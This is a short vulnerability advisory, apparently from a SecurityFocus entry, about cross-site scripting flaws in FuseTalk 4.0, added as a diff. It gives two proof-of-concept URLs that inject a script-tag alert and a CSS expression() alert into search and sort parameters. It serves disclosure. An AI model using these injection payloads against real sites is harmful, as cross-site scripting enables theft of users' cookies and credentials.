@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/42157/info
+
+FuseTalk is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+FuseTalk 4.0 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/usersearchresults.cfm?keyword=ttm--"%20><script>alert("TheTestManager.com-
+Month of Full disclosure")</script>&FT_ACTION=SearchUsers  - (IE8
+tested)
+
+or
+
+http://www.example.com/categories.aspx?catid=76&FTVAR_SORT=date&FTVAR_SORTORDER=0017ttm-"
+style=x:expression(alert("TheTestManager")) ttm=" (IE7 test)
